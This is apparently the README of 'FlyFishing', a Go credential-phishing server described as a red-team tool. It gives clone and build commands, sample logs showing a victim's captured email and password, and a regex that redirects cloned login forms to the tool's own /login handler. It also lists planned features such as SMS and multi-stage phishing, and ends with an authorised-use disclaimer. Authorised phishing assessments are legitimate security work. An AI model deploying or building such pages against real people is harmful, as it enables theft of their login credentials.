# FlyFishing 🎣
Quickly Deploy Phishing Webpages for Red Team Assessments 


# Description 🦠
Quickly deploy phishing webpages to lure victims in Red Team Assessments. This is a lighweight golang webserver which hosts the webpage locally or for one to host externally. 

# Deployment 🔨
```bash
git clone https://github.com/CharlesTheGreat77/FlyFishing
cd FlyFishing
go mod init main
go mod tidy
go build -o fishing main.go
```

# Usage 🎯
Templates can be found in **/templates** *or* found online.
```bash
./fishing -template templates/google.html
2024/09/23 06:16:27 [*] Server started at http://localhost:8888
2024/09/23 06:16:39 [*] Client IP visiting the page: 192.168.0.42:54773
2024/09/23 06:16:39 [*] Client IP visiting the page: 192.168.0.42:54773
2024/09/23 06:16:58 [*] Client IP on login: 192.168.0.42:54775
2024/09/23 06:16:58 [*] Received form data:
2024/09/23 06:16:58 Field: login_password, Value: admin1233
2024/09/23 06:16:58 Field: remember_me, Value: on
2024/09/23 06:16:58 Field: login_email, Value: admin@gmail.com
```

# Templates 📝
How are templates processed?
By using regex to locate action attribute(s) in the form and points such to our /login handler
```golang
re := regexp.MustCompile(`(?i)(<form[^>]*action=")([^"]*)(")`)
modified := re.ReplaceAllString(html, `${1}/login${3}`)
```
* Redirection is based on file name, save templates to **templates** with the correlating website which the form is for (ie. linkedin.html)

# Todo 🧾
* Location Detection HTML5 Geolocation [ ]
* Email Creation and Obfuscation [ ]
* SMS capabilities [ ]
* Multi-Stage Phishing Support [ ]


# But why FlyFishing? 🤔
After a previous phishing assessment, I wanted to highlight the ease of spinning up cloned phishing pages within around 20 minutes from start to finish. This would allow anyone with limited time to get crackin' wit creds! 🔥


# Credits 🪙
Templates: https://github.com/htr-tech/zphisher/tree/master/.sites

# Disclaimer
This program should only be used on environments that you own or have explicit permission to do so. The author will not be held liable for any illegal use of this program.